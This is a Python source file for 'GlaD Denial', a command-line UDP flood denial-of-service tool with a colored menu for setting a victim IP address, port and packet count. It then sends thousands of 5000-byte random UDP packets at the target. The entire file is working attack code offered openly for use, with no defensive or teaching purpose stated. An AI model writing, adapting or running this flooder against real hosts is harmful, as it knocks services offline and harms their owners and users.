import os,time,socket,random


no_colored =  "\033[0m"   
white_bold =  "\033[1;37m"
blue_bold =   "\033[1;96m"
green_bold =  "\033[1;92m"
red_bold =    "\033[1;91m"
yellow_bold = "\033[1;33m"



os.system("cls")
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(5000)
sent = 0


global_ip = ''

global_port = 0
#80

global_packets = 0
#100


class dosattack():
    def __init__(self,ipaddress,port,packets):
        self.ipaddress=ipaddress
        self.port=port
        self.packets=packets

    def __str__(self):
        return " \u001b[33m__Informations__ \n\n \u001b[31;1mIp Address: \u001b[32;1m{}\n \u001b[31;1mPort: \u001b[32;1m{}\n \u001b[31;1mPacket: \u001b[32;1m{}".format(self.ipaddress,self.port,self.packets)

    def __len__(self):
        return self.packets


def ddos():

  global sent,global_ip, global_port,global_packets


  while True:

    try:

      time.sleep(3)
      ipp = global_ip

      pport = global_port

      packetss = global_packets

      os.system("cls")
      break

    except ValueError:
     print("\n \u001b[31mPlease enter a number!")
     time.sleep(2)
     os.system("cls")



  atak1=dosattack(ipp,pport,packetss)
  print(atak1)
  os.system("cls")

  for i in range(packetss):


    print(atak1)
    s.sendto(packet,(ipp,pport))
    sent = sent + 1
    print("\n \u001b[33mAttacking>>> \u001b[31m{}".format(sent))
    os.system("cls")

  print(atak1)
  print("\n \u001b[32mAttack Completed...")
  ddos_menu()
  #input()


def ddos_menu():


    global sent,global_ip, global_port,global_packets
    global no_colored, white_bold, blue_bold, green_bold, red_bold, yellow_bold

    while True:

        print('')

        ddos_menu_inp = input(yellow_bold+'GlaD Denial> '+no_colored)



        if ddos_menu_inp == ('help'):

            print(''+green_bold)
            print('defaults  ---------------->  set defaults')
            print('attk      ---------------->  start attack')
            print('ip        ---------------->  set victim ip')
            print('port      ---------------->  set victims open port')
            print('packets   ---------------->  set packet quantity')
            print('')
            print('[*] for GlaD Denial to work you need to always set the victims ip !')
            print('')


        elif ddos_menu_inp == ('packets'):

            print('')

            pck_inp = int(input(yellow_bold+'packet quantity> '+no_colored))

            global_packets = global_packets + pck_inp

            print(str(global_packets))

            print('')



        elif ddos_menu_inp == ('port'):

            print('')

            port_inp = int(input(yellow_bold+'set port> '+no_colored))

            global_port = global_port + port_inp

            print(str(global_port))

            print('')



        elif ddos_menu_inp == ('ip'):

            print('')

            victim_inp = input(yellow_bold+'set victim ip> '+no_colored)

            global_ip =  global_ip + victim_inp

            print(str(global_ip))

            print('')



        elif ddos_menu_inp == ('defaults'):

            print('')

            global_port = global_port + 80

            global_packets = global_packets + 100

            print('victim ip = ' + global_ip)

            print('port = ' + str(global_port))

            print('packet quantity = ' + str(global_packets))

            print('')



        elif ddos_menu_inp == ('attk'):

            ddos()
            break

        else:
            print(red_bold+ddos_menu_inp+' isnt a command')




def slogan():

    print(yellow_bold)

    os.system("figlet G l a D")
    print("")
    print(blue_bold+"******************************************************")
    print(blue_bold+"* Made by Hadinon                                    *")
    print(blue_bold+"* find more tools on https://hadinon.itch.io         *")
    print(blue_bold+"* https://myhqck.000webhostapp.com                   *")
    print(blue_bold+"******************************************************")
    print("")

    ddos_menu()


slogan()

